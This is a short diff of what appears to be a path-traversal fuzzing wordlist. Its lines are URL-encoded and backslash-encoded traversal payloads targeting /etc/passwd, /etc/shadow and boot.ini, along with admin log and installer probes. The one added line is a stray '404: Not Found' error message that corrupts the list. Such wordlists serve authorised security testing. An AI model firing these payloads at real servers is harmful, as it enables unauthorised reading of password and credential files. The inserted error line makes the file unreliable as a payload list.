@@ -23,6 +23,7 @@
 ..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
 ..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow
 =3D “/..” . “%2f..
+404: Not Found
 ..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
 admin/access_log
 /admin/install.php
